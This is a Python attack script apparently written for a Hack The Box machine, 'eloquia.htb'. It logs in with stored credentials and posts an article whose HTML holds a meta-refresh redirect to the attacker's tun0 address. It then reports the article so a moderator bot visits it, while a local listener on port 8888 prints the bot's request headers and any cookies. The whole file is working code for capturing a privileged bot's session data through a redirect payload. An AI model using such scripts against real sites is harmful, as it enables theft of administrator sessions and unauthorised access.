#!/usr/bin/env python3
"""
Create an article that redirects to our server so we can see what headers/cookies the bot sends.
"""
import requests
import threading
import time
import re
import os
import sys
import random
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
from urllib.parse import urlparse, parse_qs

TARGET_ELOQUIA = "http://eloquia.htb"
TMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp")

def get_csrf(html):
    match = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', html)
    return match.group(1) if match else None

def load_credentials():
    try:
        with open(os.path.join(TMP_DIR, "username.txt")) as f:
            username = f.read().strip()
        with open(os.path.join(TMP_DIR, "password.txt")) as f:
            password = f.read().strip()
        return username, password
    except:
        return None, None

def create_banner_image():
    try:
        from PIL import Image
        img = Image.new('RGB', (200, 150))
        for i in range(200):
            for j in range(150):
                img.putpixel((i, j), (random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        buf = BytesIO()
        img.save(buf, 'PNG')
        buf.seek(0)
        return buf
    except ImportError:
        print("[-] PIL not installed")
        sys.exit(1)

def get_tun0_ip():
    import subprocess
    try:
        result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line:
                return line.split()[1].split('/')[0]
    except:
        pass
    return None

class DebugHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        print(f"\n{'='*60}")
        print(f"[INCOMING REQUEST]")
        print(f"  Path: {self.path}")
        print(f"  Client: {self.client_address}")
        print(f"\n  Headers:")
        for name, value in self.headers.items():
            print(f"    {name}: {value}")

        # Check for cookies specifically
        cookies = self.headers.get('Cookie', '')
        if cookies:
            print(f"\n  COOKIES FOUND: {cookies}")
        else:
            print(f"\n  NO COOKIES!")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body>Debug capture</body></html>')

def main():
    username, password = load_credentials()
    if not username:
        print("[-] No credentials")
        sys.exit(1)

    callback_ip = get_tun0_ip()
    if not callback_ip:
        print("[-] No tun0 IP")
        sys.exit(1)

    print(f"[*] Starting debug server on {callback_ip}:8888")

    # Start server
    server = HTTPServer(('0.0.0.0', 8888), DebugHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    # Login to Eloquia
    print(f"[*] Logging into Eloquia as {username}...")
    session = requests.Session()
    login_page = session.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    session.post(f"{TARGET_ELOQUIA}/accounts/login/",
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"}
    )

    if 'sessionid' not in session.cookies:
        print("[-] Login failed")
        sys.exit(1)

    # Create article that redirects to us
    timestamp = str(int(time.time()))
    redirect_url = f"http://{callback_ip}:8888/debug?ts={timestamp}"

    print(f"[*] Creating article with redirect to: {redirect_url}")

    create_page = session.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = get_csrf(create_page.text)

    content = f'<meta http-equiv="refresh" content="0;url={redirect_url}"><p>Debug test</p>'

    my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    resp = session.post(f"{TARGET_ELOQUIA}/article/create/",
        data={'csrfmiddlewaretoken': csrf, 'title': f"Debug {timestamp}", 'content': content},
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    # Find article ID
    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)
    else:
        my_articles = session.get(f"{TARGET_ELOQUIA}/article/mine/")
        new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
        created = new_ids - existing_ids
        if created:
            article_id = max(created)

    if not article_id:
        print("[-] Failed to create article")
        sys.exit(1)

    # Report it
    print(f"[*] Article created: ID {article_id}")
    session.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
    print(f"[*] Article reported - waiting for bot (up to 3 minutes)...")
    print(f"[*] Watch for incoming request with headers...\n")

    # Wait
    try:
        for i in range(180):
            print(f"\r    Waiting: {i}s  ", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    print("\n[*] Done")
    server.shutdown()

if __name__ == "__main__":
    main()
